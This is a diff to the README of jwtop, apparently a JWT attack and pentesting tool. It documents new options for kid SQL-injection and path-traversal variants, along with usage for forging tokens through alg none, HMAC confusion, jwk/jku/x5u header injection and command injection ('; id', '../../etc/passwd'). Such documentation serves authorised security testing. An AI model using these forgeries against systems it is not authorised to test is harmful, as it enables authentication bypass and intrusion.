@@ -364,7 +364,7 @@ jwtop crack <token> --url <url> --fuzz [--fuzz-max-string-len <n>]
 | `--workers` | Concurrent workers for secret brute-force (default `8`) |
 | `--delay` | Delay between probe requests to the target URL, e.g. `200ms` (default: no delay) |
 | `--kid-sql-table` | Table name for the kid SQL injection payload (default `tokens`) |
-| `--kid-path` | File path for the kid path traversal payload (default `/dev/null`) |
+| `--kid-path` | File path for the kid path traversal payload (default: try several common scenarios — `/dev/null` and a range of `../` depths, a filter-bypass variant, and the Windows `NUL` device) |
 | `--jku-server-addr` | Bind address for a local JWKS server used by the `jkuinjection` check, e.g. `0.0.0.0:8089` — must be an address the *target* can reach, not just jwtop (`127.0.0.1`/`localhost` only work when the target runs on the same host as jwtop); check is skipped if unset. See [callback requirements](#callback-requirements-jkuinjection--x5uinjection) below |
 | `--x5u-server-addr` | Bind address for a local certificate server used by the `x5uinjection` check, e.g. `0.0.0.0:8090` — same reachability requirement as `--jku-server-addr`; check is skipped if unset |
 | `--token-in` | Where to place the exploited JWT: `header`, `cookie`, `query`, or `body` (default `header`) |
@@ -389,7 +389,7 @@ jwtop crack <token> --url <url> --fuzz [--fuzz-max-string-len <n>]
 | `nullsig` | Token has an empty signature segment |
 | `weaksecret` | Cracks the HMAC signing secret via dictionary attack |
 
-**Online-only checks** (require `--url`): `algnone` (×4 casing variants), `hmacconfusion` (requires `--key`), `psychicsig` (ECDSA-only), `kidinjection` (SQL and path traversal), `jwkinjection` (RSA/ECDSA-only, CVE-2018-0114), `jkuinjection` (RSA/ECDSA-only, requires `--jku-server-addr`), `x5cinjection` (RSA/ECDSA-only), `x5uinjection` (RSA/ECDSA-only, requires `--x5u-server-addr`), `fuzz` (claim-mutation fuzzing, opt-in via `--fuzz`).
+**Online-only checks** (require `--url`): `algnone` (×4 casing variants), `hmacconfusion` (requires `--key`), `psychicsig` (ECDSA-only), `kidinjection` (SQL injection via `--kid-sql-table`, path traversal ×9 path variants — narrow to one with `--kid-path`), `jwkinjection` (RSA/ECDSA-only, CVE-2018-0114), `jkuinjection` (RSA/ECDSA-only, requires `--jku-server-addr`), `x5cinjection` (RSA/ECDSA-only), `x5uinjection` (RSA/ECDSA-only, requires `--x5u-server-addr`), `fuzz` (claim-mutation fuzzing, opt-in via `--fuzz`).
 
 **`fuzz`** — off by default, enabled with `--fuzz`. Complements the fixed checks above by mutating every claim value (type confusion, an oversized string, special characters, an explicit null) and comparing each mutated response against a reference response captured from the original token. It flags a mutation when the response diverges: a `5xx` status, a leaked stack trace/exception, or a body length far from the reference's — signs of a parsing bug the fixed checks don't target. `--fuzz-max-string-len` controls the oversized-string payload length.
 
@@ -548,8 +548,10 @@ Prints the recovered secret on success (exit `0`), exits `1` when not found. `--
 ```sh
 jwtop exploit kidinjection --mode sql $TOKEN                              # SQL injection (table: tokens)
 jwtop exploit kidinjection --mode sql --sql-table keys $TOKEN             # SQL injection (custom table)
+jwtop exploit kidinjection --mode sql --all $TOKEN                        # one token per candidate table name
 jwtop exploit kidinjection --mode path $TOKEN                             # path traversal to /dev/null
 jwtop exploit kidinjection --mode path --path /proc/sys/kernel/ns_last_pid $TOKEN  # custom path
+jwtop exploit kidinjection --mode path --all $TOKEN                       # one token per path traversal variant
 jwtop exploit kidinjection --mode command $TOKEN                         # shell metacharacter payload ("; id")
 jwtop exploit kidinjection --mode command --all $TOKEN                   # one token per shell payload variant
 jwtop exploit kidinjection --mode ldap $TOKEN                            # LDAP filter injection payload
@@ -566,7 +568,7 @@ jwtop exploit kidinjection --mode raw --kid "../../etc/passwd" --secret "" $TOKE
 | `--secret` | HMAC secret to sign with (overrides mode default) |
 | `--sql-table` | Table name for `sql` mode payload (default `tokens`) |
 | `--path` | File path for `path` mode payload (default `/dev/null`) |
-| `--all` | With `command` or `ldap` mode, print one token per known payload variant |
+| `--all` | Print one token per known payload variant for the selected mode (not valid with `raw`) |
 
 **jwkinjection** — generates a self-signed RSA/ECDSA key pair, embeds the public key directly in the token's `jwk` header field, and re-signs with the matching private key (CVE-2018-0114). Servers that trust an embedded `jwk` instead of validating against a known keyset accept the forged token.
 
@@ -789,7 +791,9 @@ token, err   = exploit.BlankSecret(tokenString)
 token, err   = exploit.NullSignature(tokenString)
 token, err   = exploit.HMACConfusion(tokenString, pubPEM)
 token, err   = exploit.KidSQLInjection(tokenString, exploit.DefaultKidSQLPayload, []byte("secret"))
+tokens, err  = exploit.KidSQLInjectionAll(tokenString, []byte("secret"))           // one token per candidate table name
 token, err   = exploit.KidPathTraversal(tokenString, exploit.DefaultKidPathTraversalPayload, []byte(""))
+tokens, err  = exploit.KidPathTraversalAll(tokenString, []byte(""))                // one token per path traversal variant
 token, err   = exploit.KidCommandInjection(tokenString, exploit.DefaultKidCommandInjectionPayload, []byte(""))
 tokens, err  = exploit.KidCommandInjectionAll(tokenString, []byte(""))  // one token per shell payload variant
 token, err   = exploit.KidLDAPInjection(tokenString, exploit.DefaultKidLDAPInjectionPayload, []byte(""))
